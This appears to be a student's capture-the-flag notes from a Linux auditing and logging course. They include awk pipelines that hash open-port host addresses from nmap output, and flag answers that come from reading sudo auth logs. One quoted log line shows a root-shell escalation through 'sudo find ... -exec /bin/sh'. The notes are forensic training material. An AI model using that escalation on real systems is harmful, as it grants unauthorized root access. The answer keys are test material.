awk '/<host>/ {rec=""; ip=""; f=0} /<host>/,/<\/host>/ {rec = rec $0 ORS} /<state state="open"/ {f=1} /<\/host>/ {if (f) print rec}' /home/garviel/output.xml | \
grep -oP 'addr="\K[^"]*' | \
tr -d '\n' | \
md5sum



awk '
BEGIN { RS="</host>"; FS="\n"; OFS="" }
/state="open"/ {
  for (i=1; i<=NF; i++) {
    if ($i ~ /<address addr=/) {
      gsub(/.*addr="|".*/, "", $i);
      printf $i
    }
  }
}
' /home/garviel/output.xml | md5sum


######################################################### Linux Auditing and Logging Whut 4 15 #########################################################

Challenge only allows ONE attempt

What user successfully executed commands?

*********************************************************     SOLUTION        **********************************************************

Apr 6 13:35:00 linux-opstation-7qhp systemd: pam_unix(systemd-user:session): session opened for user Saruman by (uid=0)
Apr 6 13:35:01 linux-opstation-7qhp sudo: Saruman : TTY=pts/0 ; PWD=/home/Saruman ; USER=root ; COMMAND=find /var/tmp -type f
Apr 6 13:35:02 linux-opstation-7qhp sudo: pam_unix(sudo:session): session opened for user root by Saruman(uid=0)

Saruman was the only one that could run sudo commands 


######################################################### Linux Auditing and Logging Whut 5 15 #########################################################

Analyze the file to determine when a shell was spawned as a different user and how long it was maintained for.

Provide the :
duration the shell was maintained
the command used to create it
number of times they [successfully] escalated
Flag Format: #h,#m,command,number of times

Round minutes up to the closest number divisible by 10.

*********************************************************     SOLUTION        **********************************************************


Look for binary /bin/sh 

Apr 6 13:37:31 linux-opstation-7qhp sudo: Saruman : TTY=pts/0 ; PWD=/home/Saruman ; USER=root ; COMMAND=find /etc/passwd -exec /bin/sh {} ;

2h,30m,find /etc/passwd -exec /bin/sh \;,2
